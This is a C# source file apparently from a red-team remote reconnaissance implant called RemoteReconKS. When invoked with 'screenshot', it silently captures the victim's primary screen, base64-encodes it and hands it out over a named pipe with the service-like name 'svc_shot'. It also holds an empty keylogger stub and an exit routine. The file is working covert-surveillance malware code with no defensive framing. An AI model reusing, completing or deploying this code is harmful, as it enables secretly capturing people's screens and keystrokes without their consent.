using System;
using System.IO;
using System.IO.Pipes;
using System.Windows.Forms;
using System.Drawing;
using System.Drawing.Imaging;
using System.Threading;

namespace RemoteReconKS
{
    public class RemoteReconKS
    {

        public static void Execute(string capability)
        {
            if (capability.ToLower() == "screenshot")
            {
                
                NamedPipeServerStream server = new NamedPipeServerStream("svc_shot", PipeDirection.InOut, 1, PipeTransmissionMode.Message);
                server.WaitForConnection();
                StreamWriter sw = new StreamWriter(server);

                //byte[] image = screenshot();
                sw.WriteLine(screenshot());
                Thread.Sleep(5000);
                sw.Flush();

                server.Close();
            }
        }

        public static string screenshot()
        {
            //byte[] rawImage = new byte[1] { 0 };

            try
            {
                string encImage;
                var screenshotobject = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                var DrawingGraphics = Graphics.FromImage(screenshotobject);

                DrawingGraphics.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, screenshotobject.Size, CopyPixelOperation.SourceCopy);
                DrawingGraphics.Dispose();

                MemoryStream ms = new MemoryStream();
                screenshotobject.Save(ms, ImageFormat.Png);
                byte[] imgBytes = ms.ToArray();
                encImage = Convert.ToBase64String(imgBytes);
                return encImage;
            }
            catch (Exception e)
            {
                return e.ToString();
            }
        }

        public void keylogger()
        {
            //Keylogger code here
        }

        public void exit()
        {
            //exit
            System.Environment.Exit(0);
        }
    }
}
